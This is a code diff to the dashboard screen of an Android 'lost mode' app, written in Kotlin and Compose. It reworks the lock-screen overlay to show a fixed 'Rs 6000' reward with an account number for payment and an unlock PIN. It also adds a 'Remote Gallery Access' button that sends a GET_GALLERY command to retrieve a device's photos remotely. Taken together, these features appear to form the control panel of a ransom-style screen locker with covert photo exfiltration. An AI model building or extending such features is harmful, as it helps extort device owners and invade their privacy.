@@ -33,6 +33,7 @@ import androidx.compose.material.icons.filled.Info
 import androidx.compose.material.icons.filled.Lock
 import androidx.compose.material.icons.filled.Palette
 import androidx.compose.material.icons.filled.Phone
+import androidx.compose.material.icons.filled.PhotoLibrary
 import androidx.compose.material.icons.filled.Refresh
 import androidx.compose.material.icons.filled.SatelliteAlt
 import androidx.compose.material.icons.filled.Security
@@ -459,11 +460,11 @@ fun DashboardScreen(
 
                     Text(
                         text = "Header Title & Subtitle:",
-                        fontSize = 12.sp,
+                        fontSize = 11.sp,
                         fontWeight = FontWeight.Bold,
                         color = HighDensityOnSurface
                     )
-                    Spacer(modifier = Modifier.height(4.dp))
+                    Spacer(modifier = Modifier.height(2.dp))
                     OutlinedTextField(
                         value = overlayConfig.title,
                         onValueChange = {
@@ -489,12 +490,12 @@ fun DashboardScreen(
                     Spacer(modifier = Modifier.height(10.dp))
 
                     Text(
-                        text = "Custom Lost Message:",
-                        fontSize = 12.sp,
+                        text = "Custom Lock Message:",
+                        fontSize = 11.sp,
                         fontWeight = FontWeight.Bold,
                         color = HighDensityOnSurface
                     )
-                    Spacer(modifier = Modifier.height(4.dp))
+                    Spacer(modifier = Modifier.height(2.dp))
                     OutlinedTextField(
                         value = overlayConfig.message,
                         onValueChange = {
@@ -504,9 +505,31 @@ fun DashboardScreen(
                         modifier = Modifier
                             .fillMaxWidth()
                             .testTag("lost_message_input"),
-                        placeholder = { Text("Enter custom message displayed on lock screen...") },
+                        placeholder = { Text("Enter custom lock screen message...") },
                         singleLine = false,
                         maxLines = 3
+                    )
+
+                    Spacer(modifier = Modifier.height(10.dp))
+
+                    Text(
+                        text = "Reward Note:",
+                        fontSize = 11.sp,
+                        fontWeight = FontWeight.Bold,
+                        color = HighDensityOnSurface
+                    )
+                    Spacer(modifier = Modifier.height(2.dp))
+                    OutlinedTextField(
+                        value = overlayConfig.rewardNote,
+                        onValueChange = {
+                            overlayConfig = overlayConfig.copy(rewardNote = it)
+                            LostModeManager.saveOverlayConfig(context, overlayConfig)
+                        },
+                        modifier = Modifier
+                            .fillMaxWidth()
+                            .testTag("reward_note_input"),
+                        placeholder = { Text("REWARD: Rs 6000") },
+                        singleLine = true
                     )
 
                     Spacer(modifier = Modifier.height(10.dp))
@@ -514,7 +537,31 @@ fun DashboardScreen(
                     Row(modifier = Modifier.fillMaxWidth()) {
                         Column(modifier = Modifier.weight(1f)) {
                             Text(
-                                text = "Owner Phone:",
+                                text = "Account Number for Reward:",
+                                fontSize = 11.sp,
+                                fontWeight = FontWeight.Bold,
+                                color = HighDensityOnSurface
+                            )
+                            Spacer(modifier = Modifier.height(2.dp))
+                            OutlinedTextField(
+                                value = overlayConfig.accountNumber,
+                                onValueChange = {
+                                    overlayConfig = overlayConfig.copy(accountNumber = it)
+                                    LostModeManager.saveOverlayConfig(context, overlayConfig)
+                                },
+                                modifier = Modifier
+                                    .fillMaxWidth()
+                                    .testTag("account_number_input"),
+                                placeholder = { Text("0300-1234567") },
+                                singleLine = true
+                            )
+                        }
+
+                        Spacer(modifier = Modifier.width(8.dp))
+
+                        Column(modifier = Modifier.weight(1f)) {
+                            Text(
+                                text = "Owner Contact Phone:",
                                 fontSize = 11.sp,
                                 fontWeight = FontWeight.Bold,
                                 color = HighDensityOnSurface
@@ -529,31 +576,7 @@ fun DashboardScreen(
                                 modifier = Modifier
                                     .fillMaxWidth()
                                     .testTag("owner_phone_input"),
-                                placeholder = { Text("+15550192834") },
-                                singleLine = true
-                            )
-                        }
-
-                        Spacer(modifier = Modifier.width(8.dp))
-
-                        Column(modifier = Modifier.weight(1f)) {
-                            Text(
-                                text = "Emergency Email:",
-                                fontSize = 11.sp,
-                                fontWeight = FontWeight.Bold,
-                                color = HighDensityOnSurface
-                            )
-                            Spacer(modifier = Modifier.height(2.dp))
-                            OutlinedTextField(
-                                value = overlayConfig.ownerEmail,
-                                onValueChange = {
-                                    overlayConfig = overlayConfig.copy(ownerEmail = it)
-                                    LostModeManager.saveOverlayConfig(context, overlayConfig)
-                                },
-                                modifier = Modifier
-                                    .fillMaxWidth()
-                                    .testTag("owner_email_input"),
-                                placeholder = { Text("owner@email.com") },
+                                placeholder = { Text("+923001234567") },
                                 singleLine = true
                             )
                         }
@@ -561,172 +584,25 @@ fun DashboardScreen(
 
                     Spacer(modifier = Modifier.height(10.dp))
 
-                    Row(modifier = Modifier.fillMaxWidth()) {
-                        Column(modifier = Modifier.weight(1f)) {
-                            Text(
-                                text = "Reward Offer (Optional):",
-                                fontSize = 11.sp,
-                                fontWeight = FontWeight.Bold,
-                                color = HighDensityOnSurface
-                            )
-                            Spacer(modifier = Modifier.height(2.dp))
-                            OutlinedTextField(
-                                value = overlayConfig.rewardNote,
-                                onValueChange = {
-                                    overlayConfig = overlayConfig.copy(rewardNote = it)
-                                    LostModeManager.saveOverlayConfig(context, overlayConfig)
-                                },
-                                modifier = Modifier
-                                    .fillMaxWidth()
-                                    .testTag("reward_note_input"),
-                                placeholder = { Text("e.g. $100 Cash Reward") },
-                                singleLine = true
-                            )
-                        }
-
-                        Spacer(modifier = Modifier.width(8.dp))
-
-                        Column(modifier = Modifier.weight(0.7f)) {
-                            Text(
-                                text = "Unlock PIN:",
-                                fontSize = 11.sp,
-                                fontWeight = FontWeight.Bold,
-                                color = HighDensityOnSurface
-                            )
-                            Spacer(modifier = Modifier.height(2.dp))
-                            OutlinedTextField(
-                                value = overlayConfig.pin,
-                                onValueChange = {
-                                    overlayConfig = overlayConfig.copy(pin = it)
-                                    LostModeManager.saveOverlayConfig(context, overlayConfig)
-                                },
-                                modifier = Modifier
-                                    .fillMaxWidth()
-                                    .testTag("unlock_pin_input"),
-                                placeholder = { Text("1234") },
-                                singleLine = true
-                            )
-                        }
-                    }
-
-                    Spacer(modifier = Modifier.height(12.dp))
-
-                    // Theme selector
-                    Text(
-                        text = "Overlay Color Theme:",
-                        fontSize = 11.sp,
-                        fontWeight = FontWeight.Bold,
-                        color = HighDensityOnSurface
-                    )
-                    Spacer(modifier = Modifier.height(6.dp))
-
-                    val themes = listOf("Red Emergency", "Matrix Cyber", "Deep Navy", "Caution Gold", "Midnight Purple")
-                    Row(
-                        modifier = Modifier.fillMaxWidth(),
-                        horizontalArrangement = Arrangement.spacedBy(4.dp)
-                    ) {
-                        themes.forEach { themeName ->
-                            val isSelected = overlayConfig.theme == themeName
-                            Button(
-                                onClick = {
-                                    overlayConfig = overlayConfig.copy(theme = themeName)
-                                    LostModeManager.saveOverlayConfig(context, overlayConfig)
-                                },
-                                modifier = Modifier.weight(1f).height(36.dp),
-                                colors = ButtonDefaults.buttonColors(
-                                    containerColor = if (isSelected) Color(0xFF1976D2) else Color(0xFFEEEEEE),
-                                    contentColor = if (isSelected) Color.White else Color.Black
-                                ),
-                                contentPadding = androidx.compose.foundation.layout.PaddingValues(0.dp),
-                                shape = RoundedCornerShape(8.dp)
-                            ) {
-                                Text(
-                                    text = themeName.split(" ").first(),
-                                    fontSize = 10.sp,
-                                    fontWeight = if (isSelected) FontWeight.Bold else FontWeight.Normal
-                                )
-                            }
-                        }
-                    }
-
-                    Spacer(modifier = Modifier.height(12.dp))
-
-                    // Icon selector
-                    Text(
-                        text = "Overlay Icon Symbol:",
-                        fontSize = 11.sp,
-                        fontWeight = FontWeight.Bold,
-                        color = HighDensityOnSurface
-                    )
-                    Spacer(modifier = Modifier.height(6.dp))
-
-                    val icons = listOf("Lock", "Shield", "Warning", "Phone", "Info")
-                    Row(
-                        modifier = Modifier.fillMaxWidth(),
-                        horizontalArrangement = Arrangement.spacedBy(4.dp)
-                    ) {
-                        icons.forEach { iconName ->
-                            val isSelected = overlayConfig.icon == iconName
-                            Button(
-                                onClick = {
-                                    overlayConfig = overlayConfig.copy(icon = iconName)
-                                    LostModeManager.saveOverlayConfig(context, overlayConfig)
-                                },
-                                modifier = Modifier.weight(1f).height(36.dp),
-                                colors = ButtonDefaults.buttonColors(
-                                    containerColor = if (isSelected) Color(0xFF388E3C) else Color(0xFFEEEEEE),
-                                    contentColor = if (isSelected) Color.White else Color.Black
-                                ),
-                                contentPadding = androidx.compose.foundation.layout.PaddingValues(0.dp),
-                                shape = RoundedCornerShape(8.dp)
-                            ) {
-                                Text(
-                                    text = iconName,
-                                    fontSize = 10.sp,
-                                    fontWeight = if (isSelected) FontWeight.Bold else FontWeight.Normal
-                                )
-                            }
-                        }
-                    }
-
-                    Spacer(modifier = Modifier.height(12.dp))
-
-                    // Toggles
-                    Row(
-                        modifier = Modifier.fillMaxWidth(),
-                        horizontalArrangement = Arrangement.SpaceBetween,
-                        verticalAlignment = Alignment.CenterVertically
-                    ) {
+                    Column(modifier = Modifier.fillMaxWidth()) {
                         Text(
-                            text = "Include Loud Siren Alarm Button:",
-                            fontSize = 12.sp,
+                            text = "Device Unlock PIN:",
+                            fontSize = 11.sp,
+                            fontWeight = FontWeight.Bold,
                             color = HighDensityOnSurface
                         )
-                        Switch(
-                            checked = overlayConfig.showSiren,
-                            onCheckedChange = {
-                                overlayConfig = overlayConfig.copy(showSiren = it)
+                        Spacer(modifier = Modifier.height(2.dp))
+                        OutlinedTextField(
+                            value = overlayConfig.pin,
+                            onValueChange = {
+                                overlayConfig = overlayConfig.copy(pin = it)
                                 LostModeManager.saveOverlayConfig(context, overlayConfig)
-                            }
-                        )
-                    }
-
-                    Row(
-                        modifier = Modifier.fillMaxWidth(),
-                        horizontalArrangement = Arrangement.SpaceBetween,
-                        verticalAlignment = Alignment.CenterVertically
-                    ) {
-                        Text(
-                            text = "Display Owner Contact Card:",
-                            fontSize = 12.sp,
-                            color = HighDensityOnSurface
-                        )
-                        Switch(
-                            checked = overlayConfig.showContact,
-                            onCheckedChange = {
-                                overlayConfig = overlayConfig.copy(showContact = it)
-                                LostModeManager.saveOverlayConfig(context, overlayConfig)
-                            }
+                            },
+                            modifier = Modifier
+                                .fillMaxWidth()
+                                .testTag("unlock_pin_input"),
+                            placeholder = { Text("1234") },
+                            singleLine = true
                         )
                     }
 
@@ -780,11 +656,90 @@ fun DashboardScreen(
 
                     Spacer(modifier = Modifier.height(6.dp))
                     Text(
-                        text = "Customize themes, emergency contacts, reward notes, and custom overlay messages. Changes are saved automatically.",
+                        text = "Static lock screen overlay with fixed Rs 6000 reward and account payment details.",
                         fontSize = 11.sp,
                         color = Color.Gray,
                         textAlign = TextAlign.Center
                     )
+                }
+            }
+
+            // Remote Gallery Access Card (GET_GALLERY)
+            Card(
+                modifier = Modifier.fillMaxWidth(),
+                shape = RoundedCornerShape(24.dp),
+                colors = CardDefaults.cardColors(containerColor = HighDensityCardWhite),
+                border = BorderStroke(1.dp, HighDensityOutline)
+            ) {
+                Column(modifier = Modifier.padding(20.dp)) {
+                    Row(
+                        modifier = Modifier.fillMaxWidth(),
+                        horizontalArrangement = Arrangement.SpaceBetween,
+                        verticalAlignment = Alignment.CenterVertically
+                    ) {
+                        Row(verticalAlignment = Alignment.CenterVertically) {
+                            Icon(
+                                imageVector = Icons.Default.PhotoLibrary,
+                                contentDescription = null,
+                                tint = HighDensityPrimary,
+                                modifier = Modifier.size(22.dp)
+                            )
+                            Spacer(modifier = Modifier.width(8.dp))
+                            Text(
+                                text = "REMOTE GALLERY ACCESS",
+                                fontSize = 12.sp,
+                                fontWeight = FontWeight.Bold,
+                                color = HighDensityOnSurface,
+                                letterSpacing = 0.5.sp
+                            )
+                        }
+                        Badge(
+                            containerColor = HighDensityPrimaryContainer,
+                            contentColor = HighDensityPrimary
+                        ) {
+                            Text(
+                                text = "GET_GALLERY",
+                                modifier = Modifier.padding(horizontal = 6.dp, vertical = 2.dp),
+                                fontSize = 9.sp,
+                                fontWeight = FontWeight.Bold
+                            )
+                        }
+                    }
+
+                    Spacer(modifier = Modifier.height(10.dp))
+
+                    Text(
+                        text = "Retrieve gallery photos and media information remotely using the single GET_GALLERY command.",
+                        fontSize = 12.sp,
+                        color = HighDensitySecondary
+                    )
+
+                    Spacer(modifier = Modifier.height(14.dp))
+
+                    Button(
+                        onClick = { viewModel.executeRemoteCommand("GET_GALLERY") },
+                        modifier = Modifier
+                            .fillMaxWidth()
+                            .height(48.dp)
+                            .testTag("get_gallery_command_button"),
+                        shape = RoundedCornerShape(14.dp),
+                        colors = ButtonDefaults.buttonColors(
+                            containerColor = HighDensityPrimary,
+                            contentColor = Color.White
+                        )
+                    ) {
+                        Icon(
+                            imageVector = Icons.Default.PhotoLibrary,
+                            contentDescription = "GET_GALLERY",
+                            modifier = Modifier.size(18.dp)
+                        )
+                        Spacer(modifier = Modifier.width(8.dp))
+                        Text(
+                            text = "EXECUTE GET_GALLERY COMMAND",
+                            fontSize = 12.sp,
+                            fontWeight = FontWeight.Bold
+                        )
+                    }
                 }
             }
 
